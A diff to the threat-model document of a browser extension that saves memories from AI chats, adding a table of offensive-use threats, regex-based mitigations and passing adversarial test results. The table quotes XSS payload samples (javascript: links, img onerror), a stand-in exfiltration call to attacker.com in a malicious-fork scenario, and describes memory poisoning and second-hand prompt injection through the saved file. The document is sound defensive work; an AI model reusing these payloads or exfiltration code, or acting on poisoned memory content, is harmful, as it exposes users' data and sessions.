@@ -61,9 +61,43 @@ What we do claim:
 - **No prompt injection** can cause the extension to fetch an unexpected URL, write arbitrary content to disk, or run code.
 - **No silent data egress.** The only outbound network call is to the user-chosen LLM provider, carrying the user's own conversation, with the user's own key.
 
+## Offensive-use threats (Total Recall as the weapon)
+
+A separate question from "can attackers steal user data?" is "can someone weaponise Total Recall to harm others?" Reviewed at pre-launch.
+
+| Threat | Vector | Mitigation | Status |
+|---|---|---|---|
+| Engram emits dangerous markdown link | Attacker plants conversation containing `[click](javascript:alert(1))`. User runs Extract Now. Link lands in BRAIN.md. Opening BRAIN.md in a permissive markdown viewer fires the payload. | `isValidEntry()` rejects `]\s*\(\s*(javascript|data|vbscript|file):` patterns | Code (v0.1 patch) |
+| Engram emits raw `<a href="javascript:...">` | Same scenario via HTML instead of markdown | `isValidEntry()` rejects `<a` tag and `href="javascript:..."` patterns | Code (v0.1 patch) |
+| Engram emits angle-bracket auto-link with dangerous scheme | `<javascript:alert(1)>` in transcript echoed by LLM | `isValidEntry()` rejects `<\s*javascript:` etc. | Code (v0.1 patch) |
+| Engram emits HTML img with onerror | Attacker plants `<img onerror=...>` | `isValidEntry()` rejects via `on\w+\s*=` and `<\s*img` | Code |
+| Memory poisoning via untrusted conversation | User runs Extract Now on a shared/public Claude conversation crafted by an attacker. The "decision" Engram extracts may contain attacker-chosen content (e.g. "Chose to install package X because it's the best"). Auto-inject then propagates that "fact" into the user's next session. | No code-level defence — Engram extracts what the conversation says. Documented limitation: users should only Extract from conversations they had themselves. v0.2 may add a "review before save" mode. | Documented (v0.2 polish) |
+| BRAIN.md as second-hand prompt-injection vector | User shares BRAIN.md with a teammate. Teammate pastes into an AI. Attacker content from the original conversation now influences a third party's AI session. | Same as above — user controls what's in BRAIN.md. Standard prompt-injection risk for any shared text. | Out of scope |
+| Phishing fork ("Total Recall Pro" with exfil) | Bad actor forks the open-source repo, adds `fetch('attacker.com', BRAIN_CONTENT)`, distributes via fake link | Publisher hygiene at Web Store ship time, signed GitHub releases, README warns users to install only from official sources | Out of code scope |
+| Used to attack other websites (XSS-style) | Content script tries to inject into non-AI sites | manifest `matches` limits to 4 hardcoded AI domains; content script doesn't run elsewhere | Structural |
+| Used as bot/scraper | Auto-submit chats, mass-navigate, scrape | We don't auto-submit anything; every Extract requires a human click | Structural |
+| Stealing credentials from other sites | Content script reads page DOM | Content script only runs on the 4 AI domains; reads transcripts only; no cross-site action | Structural |
+| Page hijacks content script via `window.postMessage` | Malicious page posts crafted message to the content script's window | We don't listen to `window` messages; `chrome.runtime.onMessage` is same-extension only | Code |
+
+### Adversarial test cases — verified passing as of v0.1 patch
+
+These run via `node` against the regex set in `isValidEntry`:
+
+```
+PASS | plain valid entry          → accept
+PASS | script tag                 → reject
+PASS | md javascript link         → reject
+PASS | md data link               → reject
+PASS | raw <a> tag                → reject
+PASS | angle js auto-link         → reject
+PASS | href data attr             → reject
+PASS | md https link OK           → accept
+```
+
 ## Future work (v0.2+)
 
 - **Encrypted key storage** — passphrase-derived key wraps the API key at rest. Mitigates filesystem-compromise threat partially. Costs onboarding friction.
 - **Audit log** — append-only record of what Total Recall did and when. User-visible.
 - **Signed releases** — Web Store publication step.
 - **Optional Tor / proxy support** — for users who don't want their LLM provider to see their IP.
+- **Review-before-save mode** — show Engram output and require user confirmation before appending to BRAIN.md. Mitigates memory-poisoning threat from extracting untrusted conversations.
